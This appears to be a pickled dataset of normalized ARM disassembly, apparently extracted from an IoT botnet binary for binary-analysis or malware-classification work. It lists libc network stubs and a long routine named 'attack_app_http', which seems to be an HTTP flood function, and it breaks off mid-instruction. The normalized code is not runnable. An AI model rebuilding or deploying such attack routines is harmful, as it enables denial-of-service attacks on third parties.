(lp0
(S'.init_proc'
p1
S'"MOV~R12,SP\nSTMFD~SP!,{R4-R12,LR,PC}\nSUB~R11,R12,0\nBL~FOO\nBL~FOO\nLDMDB~R11,{R4-R11,SP,PC}"'
p2
L24L
tp3
a(S'ioctl'
p4
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p5
L12L
tp6
a(S'recv'
p7
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p8
L12L
tp9
a(S'connect'
p10
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p11
L12L
tp12
a(S'sigemptyset'
p13
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p14
L12L
tp15
a(S'memmove'
p16
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p17
L12L
tp18
a(S'getpid'
p19
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p20
L12L
tp21
a(S'prctl'
p22
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p23
L12L
tp24
a(S'memcpy'
p25
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p26
L12L
tp27
a(S'readlink'
p28
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p29
L12L
tp30
a(S'malloc'
p31
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p32
L12L
tp33
a(S'sleep'
p34
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p35
L12L
tp36
a(S'recvfrom'
p37
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p38
L12L
tp39
a(S'socket'
p40
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p41
L12L
tp42
a(S'select'
p43
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p44
L12L
tp45
a(S'readdir'
p46
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p47
L12L
tp48
a(S'sigaddset'
p49
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p50
L12L
tp51
a(S'send'
p52
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p53
L12L
tp54
a(S'abort'
p55
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p56
L12L
tp57
a(S'accept'
p58
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p59
L12L
tp60
a(S'calloc'
p61
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p62
L12L
tp63
a(S'write'
p64
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p65
L12L
tp66
a(S'kill'
p67
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p68
L12L
tp69
a(S'bind'
p70
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p71
L12L
tp72
a(S'inet_addr'
p73
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p74
L12L
tp75
a(S'chdir'
p76
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p77
L12L
tp78
a(S'setsockopt'
p79
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p80
L12L
tp81
a(S'signal'
p82
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p83
L12L
tp84
a(S'read'
p85
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p86
L12L
tp87
a(S'unlink'
p88
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p89
L12L
tp90
a(S'sendto'
p91
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p92
L12L
tp93
a(S'realloc'
p94
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p95
L12L
tp96
a(S'listen'
p97
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p98
L12L
tp99
a(S'fork'
p100
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p101
L12L
tp102
a(S'__uClibc_main'
p103
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p104
L12L
tp105
a(S'memset'
p106
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p107
L12L
tp108
a(S'getppid'
p109
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p110
L12L
tp111
a(S'time'
p112
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p113
L12L
tp114
a(S'opendir'
p115
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p116
L12L
tp117
a(S'getsockopt'
p118
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p119
L12L
tp120
a(S'__errno_location'
p121
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p122
L12L
tp123
a(S'exit'
p124
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p125
L12L
tp126
a(S'atoi'
p127
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p128
L12L
tp129
a(S'open'
p130
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p131
L12L
tp132
a(S'clock'
p133
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p134
L12L
tp135
a(S'setsid'
p136
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p137
L12L
tp138
a(S'closedir'
p139
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p140
L12L
tp141
a(S'fcntl'
p142
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p143
L12L
tp144
a(S'close'
p145
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p146
L12L
tp147
a(S'raise'
p148
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p149
L12L
tp150
a(S'free'
p151
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p152
L12L
tp153
a(S'sigprocmask'
p154
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p155
L12L
tp156
a(S'getsockname'
p157
S'"ADR~R12,0\nADD~R12,R12,0\nLDR~PC,[R12,0]"'
p158
L12L
tp159
a(S'__do_global_dtors_aux'
p160
S'"STMFD~SP!,{R4,R5,LR}\nLDR~R5,<STR>\nLDRB~R3,[R5]\nCMP~R3,0\nLDMNEFD~SP!,{R4,R5,PC}\nLDR~R4,<STR>\nLDR~R3,[R4]\nLDR~R2,[R3]\nCMP~R2,0\nBEQ~FOO\nADD~R3,R3,0\nSTR~R3,[R4]\nMOV~LR,PC\nMOV~PC,R2\nLDR~R3,[R4]\nLDR~R2,[R3]\nCMP~R2,0\nBNE~FOO\nLDR~R3,<STR>\nCMP~R3,0\nLDRNE~R0,<STR>\nMOVNE~LR,PC\nMOVNE~PC,R3\nMOV~R3,0\nSTRB~R3,[R5]\nLDMFD~SP!,{R4,R5,PC}"'
p161
L104L
tp162
a(S'call___do_global_dtors_aux'
p163
S'"STR~LR,[SP,-0]\nLDR~PC,[SP]"'
p164
L8L
tp165
a(S'frame_dummy'
p166
S'"LDR~R3,<STR>\nCMP~R3,0\nSTR~LR,[SP,-0]\nLDR~R0,<STR>\nLDR~R1,<STR>\nMOVNE~LR,PC\nMOVNE~PC,R3\nLDR~R0,<STR>\nLDR~R3,[R0]\nCMP~R3,0\nLDR~R3,<STR>\nLDREQ~PC,[SP]\nCMP~R3,0\nLDREQ~PC,[SP]\nMOV~LR,PC\nMOV~PC,R3\nLDR~PC,[SP]"'
p167
L68L
tp168
a(S'call_frame_dummy'
p169
S'"STR~LR,[SP,-0]\nLDR~PC,[SP]"'
p170
L8L
tp171
a(S'_start'
p172
S'"MOV~R11,0\nMOV~LR,0\nLDR~R1,[SP]\nMOV~R2,SP\nSTR~R2,[SP,-0]\nSTR~R0,[SP,-0]\nLDR~R12,<STR>\nSTR~R12,[SP,-0]\nLDR~R0,<STR>\nLDR~R3,<STR>\nB~FOO"'
p173
L44L
tp174
a(S'attack_app_http'
p175
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R0,R4\nMOV~R1,R3\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R11,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nBL~FOO\nMOV~R9,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSTR~R0,[SP,0]\nADD~R0,SP,0\nADD~R0,R0,0\nSUB~R0,R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nCMP~R9,0\nCMPNE~R11,0\nMOVNE~R4,0\nMOVEQ~R4,0\nBEQ~FOO\nMOV~R0,R9\nBL~FOO\nCMP~R0,0\nBGT~FOO\nMOV~R0,R11\nBL~FOO\nCMP~R0,0\nBGT~FOO\nLDR~R0,[SP,0]\nBL~FOO\nCMP~R0,0\nADDLE~R0,SP,0\nSTRLE~R4,[R0,0]\nBLE~FOO\nB~FOO\nLDR~R3,[SP,0]\nLDRB~R1,[R3,R2]\nSUB~R3,R1,0\nCMP~R3,0\nSUBLS~R3,R1,0\nLDRLS~R12,[SP,0]\nSTRLSB~R3,[R12,R2]\nADD~R0,SP,0\nLDR~R3,[R0,0]\nADD~R3,R3,0\nSTR~R3,[R0,0]\nLDR~R0,[SP,0]\nBL~FOO\nADD~R1,SP,0\nLDR~R2,[R1,0]\nCMP~R0,R2\nBGT~FOO\nCMP~R6,0\nMOVGE~R6,0\nSTR~R6,[SP,0]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nMOV~R5,R0\nSTR~R0,[SP,0]\nLDR~R2,[SP,0]\nCMP~R2,0\nBLE~FOO\nMOV~R8,0\nMOV~R7,R5\nMOV~R3,0\nSTRB~R3,[R5,0]\nSUB~R3,R3,0\nSTR~R3,[R5]\nMOV~R0,R8\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R3,R0,LSL0\nSUB~R3,R3,R0,LSL0\nLDR~R12,[SP,0]\nADD~R6,R3,R12\nMOV~R10,R5\nLDR~R3,[R6,0]\nSTR~R3,[R5,0]\nADD~R0,R5,0\nSTR~R0,[SP,0]\nMOV~R1,R9\nBL~FOO\nLDRB~R3,[R5,0]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[SP,0]\nBL~FOO\nMOV~R2,R0\nMOV~R0,0\nADD~R0,R5,R0\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R3,0\nSTRB~R3,[R5,0]\nADD~R0,R7,0\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R0,0\nADD~R0,R7,R0\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R0,0\nADD~R0,R7,R0\nMOV~R1,R11\nBL~FOO\nLDRB~R3,[R6,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R6,0]\nBL~FOO\nAND~R3,R4,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R4,LSR0\nAND~R2,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R2,LSL0\nORR~R3,R3,R4\nLDRB~R2,[R6,0]\nADD~R3,R3,R0,LSRR2\nAND~R2,R3,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R3,LSR0\nAND~R1,R3,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R1,LSL0\nORR~R2,R2,R3\nSTR~R2,[R10,0]\nBL~FOO\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nLDRLS~PC,[PC,R0,LSL0]\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R7,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R7,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R7,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R7,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R7,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,[SP,0]\nMOV~R1,R9\nBL~FOO\nADD~R8,R8,0\nMOV~R3,0\nADD~R5,R5,R3\nLDR~R1,[SP,0]\nCMP~R1,R8\nBNE~FOO\nMOV~R0,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R3,0\nADD~R2,SP,0\nADD~R2,R2,0\nSUB~R2,R2,0\nMOV~R1,R3\nSTR~R1,[R3,R2]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nMOV~R3,R1\nADD~R2,SP,0\nADD~R2,R2,0\nSUB~R2,R2,0\nMOV~R0,0\nSTR~R0,[R3,R2]\nADD~R3,R3,0\nCMP~R3,0\nBNE~FOO\nLDR~R2,[SP,0]\nCMP~R2,0\nBLE~FOO\nADD~R3,R3,0\nADD~R3,R3,0\nLDR~R12,[SP,0]\nADD~R6,R12,R3\nSTR~R0,[SP,0]\nSTR~R0,[SP,0]\nMOV~R0,0\nSTR~R0,[SP,0]\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R8,R1,R0\nLDR~R2,[SP,0]\nMOV~R2,R2,LSR0\nSTR~R2,[SP,0]\nADD~R3,R1,R0\nSTR~R3,[SP,0]\nADD~R12,R1,R0\nSTR~R12,[SP,0]\nSUB~R7,R6,0\nSUB~R7,R7,0\nMOV~R11,R6\nLDRB~R3,[R6,-0]\nCMP~R3,0\nBNE~FOO\nLDR~R3,[R6,-0]\nCMP~R3,0\nMOVNE~R3,0\nSTRNEB~R3,[R6,-0]\nMOVEQ~R0,0\nSTREQB~R0,[R6,-0]\nBEQ~FOO\nB~FOO\nCMP~R3,0\nBNE~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nLDR~R2,[SP,0]\nADD~R3,R1,R2\nMOV~R12,0\nSTR~R12,[R1,R2]\nADD~R3,R3,0\nSTR~R12,[R3]\nSTR~R12,[R3]\nSTR~R12,[R3]\nMOV~R5,R6\nLDR~R0,[R6,-0]\nCMN~R0,0\nBLNE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nMOV~R4,R0\nSTR~R0,[R5,-0]\nCMN~R0,0\nBEQ~FOO\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nORR~R2,R0,0\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nLDR~R0,[R5,-0]\nMOV~R2,0\nSTR~R2,[SP]\nMOV~R1,0\nADD~R2,R2,0\nBL~FOO\nMOV~R2,0\nADD~R0,SP,0\nADD~R0,R0,0\nLDR~R1,[SP,0]\nSTRB~R2,[R0,R1]\nMOV~R3,0\nSTRB~R3,[R8,0]\nLDR~R3,[R6,-0]\nSTR~R3,[R8,0]\nLDR~R12,[SP,0]\nAND~R3,R12,0\nLDR~R0,[SP,0]\nORR~R3,R0,R3,LSL0\nSTRB~R3,[R8,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R8,0]\nLDR~R1,[SP,0]\nSTR~R1,[R5,-0]\nSTRB~R2,[R11,-0]\nLDR~R0,[R5,-0]\nMOV~R1,R8\nADD~R2,R2,0\nBL~FOO\nLDR~LR,[R5,-0]\nMOV~R1,LR,LSR0\nMOV~R0,0\nMOV~R1,R1,LSL0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R1,R1,R2\nAND~R12,LR,0\nLDR~R3,[R1,R0]\nMOV~R2,0\nORR~R3,R3,R2,LSLR12\nSTR~R3,[R1,R0]\nLDR~R3,[SP,0]\nCMP~LR,R3\nADDGT~LR,LR,R2\nSTRGT~LR,[SP,0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nLDR~R3,[R6,-0]\nLDR~R12,[SP,0]\nRSB~R3,R3,R12\nCMP~R3,0\nBLS~FOO\nMOV~R0,0\nSTRB~R0,[R6,-0]\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nB~FOO\nLDR~LR,[R6,-0]\nMOV~R1,LR,LSR0\nMOV~R0,0\nMOV~R1,R1,LSL0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R1,R1,R2\nAND~R12,LR,0\nLDR~R3,[R1,R0]\nMOV~R2,0\nORR~R3,R3,R2,LSLR12\nSTR~R3,[R1,R0]\nLDR~R3,[SP,0]\nCMP~LR,R3\nADDGT~LR,LR,R2\nSTRGT~LR,[SP,0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nMOV~R10,R6\nMOV~R3,0\nSTR~R3,[R6]\nMOV~R9,0\nSTR~R9,[R6,-0]\nMOV~R0,0\nADD~R0,R7,R0\nMOV~R1,0\nBL~FOO\nSTR~R9,[R6,0]\nLDR~R5,[SP,0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R3,0\nADD~R3,R7,R3\nSTR~R3,[SP,0]\nADD~R0,R5,R0\nMOV~R1,R3\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nADD~R1,R7,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nADD~R1,R7,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nMOV~R1,0\nADD~R1,R7,R1\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,R9\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,R9\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,R9\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nLDR~R12,[SP,0]\nCMP~R12,R9\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,R9\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,R9\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nLDR~R0,[SP,0]\nBL~FOO\nMOV~R4,R0\nMOV~R0,R5\nBL~FOO\nADD~R2,R5,R0\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R0,R5,R0\nLDR~R1,<STR>\nBL~FOO\nLDR~R3,[R10,0]\nCMP~R3,0\nBLE~FOO\nMOV~R0,R8\nBL~FOO\nADD~R0,R8,R0\nLDR~R1,<STR>\nBL~FOO\nMOV~R1,0\nADD~R0,SP,0\nSTR~R1,[R0,0]\nLDR~R3,[R10,0]\nCMP~R3,R1\nBLE~FOO\nADD~R4,SP,0\nSUB~R4,R4,0\nMOV~R0,R4\nBL~FOO\nADD~R2,SP,0\nLDR~R1,[R2,0]\nMOV~R1,R1,LSL0\nADD~R1,R1,0\nADD~R0,R4,R0\nADD~R1,R7,R1\nBL~FOO\nMOV~R0,R4\nBL~FOO\nADD~R0,R4,R0\nLDR~R1,<STR>\nBL~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nADD~R3,R3,0\nSTR~R3,[R12,0]\nLDR~R2,[R10,0]\nCMP~R2,R3\nBGT~FOO\nMOV~R0,R8\nBL~FOO\nADD~R0,R8,R0\nLDR~R1,<STR>\nBL~FOO\nLDR~R4,[SP,0]\nMOV~R0,R4\nBL~FOO\nADD~R0,R4,R0\nLDR~R1,<STR>\nBL~FOO\nLDR~R0,[SP,0]\nCMP~R0,0\nBEQ~FOO\nMOV~R0,R4\nBL~FOO\nADD~R0,R4,R0\nLDR~R1,[SP,0]\nBL~FOO\nADD~R4,R7,0\nLDR~R0,[SP,0]\nMOV~R1,R4\nBL~FOO\nCMP~R0,0\nLDREQ~R0,[SP,0]\nMOVEQ~R1,R4\nBLEQ~FOO\nLDR~R4,[R10,-0]\nMOV~R0,R8\nBL~FOO\nMOV~R2,R0\nMOV~R0,R4\nMOV~R1,R8\nMOV~R3,0\nBL~FOO\nLDR~R1,[SP,0]\nSTR~R1,[R10,-0]\nMOV~R3,0\nSTRB~R3,[R11,-0]\nLDR~LR,[R10,-0]\nMOV~R1,LR,LSR0\nMOV~R0,0\nMOV~R1,R1,LSL0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R1,R1,R2\nAND~R12,LR,0\nLDR~R3,[R1,R0]\nMOV~R2,0\nORR~R3,R3,R2,LSLR12\nSTR~R3,[R1,R0]\nLDR~R3,[SP,0]\nCMP~LR,R3\nADDGT~LR,LR,R2\nSTRGT~LR,[SP,0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nLDR~LR,[R6,-0]\nMOV~R1,LR,LSR0\nMOV~R0,0\nMOV~R1,R1,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R1,R1,R12\nAND~R12,LR,0\nLDR~R3,[R1,R0]\nMOV~R2,0\nORR~R3,R3,R2,LSLR12\nSTR~R3,[R1,R0]\nLDR~R0,[SP,0]\nCMP~LR,R0\nADDGT~LR,LR,R2\nSTRGT~LR,[SP,0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nLDR~LR,[R6,-0]\nMOV~R1,LR,LSR0\nMOV~R0,0\nMOV~R1,R1,LSL0\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R1,R1,R2\nAND~R12,LR,0\nLDR~R3,[R1,R0]\nMOV~R2,0\nORR~R3,R3,R2,LSLR12\nSTR~R3,[R1,R0]\nLDR~R3,[SP,0]\nCMP~LR,R3\nADDGT~LR,LR,R2\nSTRGT~LR,[SP,0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nLDR~LR,[R6,-0]\nMOV~R1,LR,LSR0\nMOV~R0,0\nMOV~R1,R1,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R1,R1,R12\nAND~R12,LR,0\nLDR~R3,[R1,R0]\nMOV~R2,0\nORR~R3,R3,R2,LSLR12\nSTR~R3,[R1,R0]\nLDR~R0,[SP,0]\nCMP~LR,R0\nADDGT~LR,LR,R2\nSTRGT~LR,[SP,0]\nB~FOO\nCMP~R3,0\nBNE~FOO\nMOV~R1,0\nSTRB~R1,[R6,-0]\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nB~FOO\nMOV~R2,0\nSTRB~R2,[R6,-0]\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nMOV~R3,0\nADD~R6,R6,R3\nLDR~R12,[SP,0]\nLDR~R0,[SP,0]\nCMP~R12,R0\nBNE~FOO\nLDR~R1,[SP,0]\nCMP~R1,0\nBEQ~FOO\nMOV~R2,0\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R1,R3,R2\nMOV~R5,0\nSTR~R5,[R1,0]\nMOV~R3,0\nADD~R12,SP,0\nADD~R12,R12,0\nSTR~R3,[R12,R2]\nSTR~R1,[SP]\nLDR~R0,[SP,0]\nADD~R1,SP,0\nADD~R1,R1,0\nSUB~R1,R1,0\nADD~R2,SP,0\nADD~R2,R2,0\nSUB~R2,R2,0\nMOV~R3,R5\nBL~FOO\nMOV~R4,R0\nMOV~R0,R5\nBL~FOO\nSTR~R0,[SP,0]\nCMP~R4,R5\nBLE~FOO\nLDR~R0,[SP,0]\nADD~R0,R0,0\nSTR~R0,[SP,0]\nSTR~R5,[SP,0]\nMOV~R1,0\nSTR~R1,[SP,0]\nADD~R2,SP,0\nADD~R2,R2,0\nADD~R2,R2,R1\nSTR~R2,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R12,R12,R3\nSTR~R12,[SP,0]\nMOV~R0,0\nSTR~R0,[SP,0]\nADD~R1,R1,0\nSUB~R1,R1,0\nSTR~R1,[SP,0]\nMOV~R2,0\nSTR~R2,[SP,0]\nADD~R3,R3,0\nSUB~R3,R3,0\nSTR~R3,[SP,0]\nMOV~R12,0\nSTR~R12,[SP,0]\nLDR~R0,[SP,0]\nSUB~R9,R0,0\nMOV~R6,R0\nLDR~R0,[R0,-0]\nCMN~R0,0\nBEQ~FOO\nMOV~R2,0\nMOV~R3,R0,LSR0\nMOV~R3,R3,LSL0\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R3,R3,R1\nAND~R1,R0,0\nLDR~R3,[R3,R2]\nMOV~R3,R3,LSRR1\nTST~R3,0\nBEQ~FOO\nMOV~R2,0\nSUB~R4,R2,0\nMOV~R12,0\nADD~R3,SP,0\nADD~R3,R3,0\nSTR~R12,[R3,R4]\nMOV~R5,0\nLDR~R1,[SP,0]\nSTR~R5,[R3,R1]\nLDR~R2,[SP,0]\nSTR~R2,[SP]\nMOV~R1,0\nMOV~R2,R5\nADD~R3,R3,R4\nBL~FOO\nADD~R12,SP,0\nADD~R12,R12,0\nLDR~R3,[R12,R4]\nORRS~R3,R0,R3\nLDREQ~R0,[SP,0]\nSTREQB~R5,[R0,-0]\nBEQ~FOO\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nMOV~R2,0\nLDR~R1,[SP,0]\nSTRB~R2,[R1,-0]\nB~FOO\nLDR~R1,[R6,-0]\nMOV~R2,0\nMOV~R3,R1,LSR0\nMOV~R3,R3,LSL0\nADD~R12,SP,0\nADD~R12,R12,0\nADD~R3,R3,R12\nAND~R1,R1,0\nLDR~R3,[R3,R2]\nMOV~R3,R3,LSRR1\nTST~R3,0\nBEQ~FOO\nLDR~R0,[SP,0]\nSTR~R0,[SP,0]\nLDRB~R3,[R0,-0]\nCMP~R3,0\nBNE~FOO\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nLDR~R0,[R6,-0]\nLDR~R1,[SP,0]\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nCMP~R0,0\nSTR~R0,[SP,0]\nBGT~FOO\nLDR~R0,[R6,-0]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R6,-0]\nMOV~R2,0\nLDR~R1,[SP,0]\nSTRB~R2,[R1,-0]\nB~